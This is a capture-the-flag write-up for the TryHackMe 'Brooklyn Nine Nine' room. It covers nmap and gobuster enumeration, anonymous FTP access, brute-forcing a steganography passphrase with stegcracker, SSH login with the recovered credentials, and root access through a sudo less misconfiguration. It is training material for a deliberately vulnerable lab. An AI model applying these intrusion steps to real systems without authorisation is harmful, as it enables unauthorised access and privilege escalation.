# 🚩 Brooklyn Nine Nine — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square&logo=tryhackme)
![Category](https://img.shields.io/badge/Category-Steganography%20%7C%20Privesc-blue?style=flat-square)

**Room:** [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)  
**Objective:** Capture two flags — user.txt & root.txt

---

## 🗺️ Attack Path Overview

```
Nmap → Anonymous FTP → Web Steganography → SSH Login → sudo less → Root
```

---

## 1️⃣ Enumeration

### Nmap Scan

```bash
nmap -sC -sV -A <target-ip>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | FTP | vsftpd 3.0.3 |
| 22/tcp | open | SSH | OpenSSH 7.6p1 |
| 80/tcp | open | HTTP | Apache 2.4.29 |

**Key finding:** Port 21 allows **Anonymous FTP login** — no password needed.

---

## 2️⃣ FTP — Anonymous Login

```bash
ftp <target-ip>
# Username: anonymous
# Password: (leave empty)
```

Found a file called `note_to_jake.txt`:

```
From Amy,
Jake please change your password. It is too weak and
holt will be mad if someone hacks into the nine nine.
```

**💡 Takeaway:** Jake has a **weak password** — likely crackable with rockyou.txt.

---

## 3️⃣ Web Enumeration

Visited `http://<target-ip>/` — Brooklyn Nine Nine image with some text.

Ran directory enumeration — nothing interesting found:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

Checked the **page source** and found a hidden comment:

```html
<!-- Have you ever heard of steganography? -->
```

**💡 Hint:** The image itself contains hidden data.

Downloaded the image:

```bash
wget http://<target-ip>/brooklyn99.jpg
```

---

## 4️⃣ Steganography

Tried standard tools first:

```bash
binwalk brooklyn99.jpg      # nothing useful
steghide info brooklyn99.jpg  # password protected
```

Since the FTP note mentioned a **weak password**, used `stegcracker` to brute-force it:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

```
Successfully cracked file with password: *****
Tried 20715 passwords
Your file has been written to: brooklyn99.jpg.out
```

Extracted the hidden file with the cracked password:

```bash
steghide extract -sf brooklyn99.jpg
# Enter passphrase: <cracked password>
# wrote extracted data to "note.txt"
```

```bash
cat note.txt
```

```
Holts Password:
<password here>
Enjoy!!
```

**💡 Got Holt's SSH credentials.**

---

## 5️⃣ SSH Login

```bash
ssh holt@<target-ip>
```

### User Flag

```bash
ls -al
cat user.txt
```

```
ee**********************ee  ✅
```

---

## 6️⃣ Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

```
User holt may run the following commands on brooklyn_nine_nine:
    (ALL) NOPASSWD: /bin/less
```

**`/bin/less` can be run as root with no password** — classic GTFOBins vector.

```bash
sudo less /root/root.txt
```

The flag is displayed directly in the `less` viewer.

### Root Flag

```
6*******************************5  ✅
```

---

## 📋 Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Port scanning | Nmap |
| Initial Access | Anonymous FTP | ftp |
| Credential Discovery | Steganography + brute-force | stegcracker, steghide |
| Login | SSH | ssh |
| Privilege Escalation | sudo less (GTFOBins) | less |

---

## 🔑 Key Lessons

- Always check **Anonymous FTP** — it's often left open with sensitive files
- **Page source comments** can reveal hidden hints
- Weak passwords + steganography = classic CTF combo
- `sudo -l` should always be your first privesc check
- `less`, `vim` with sudo = instant root via GTFOBins

---

## 🔗 Resources

- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [stegcracker](https://github.com/Paradoxis/StegCracker)
- [TryHackMe Room](https://tryhackme.com/room/brooklynninenine)
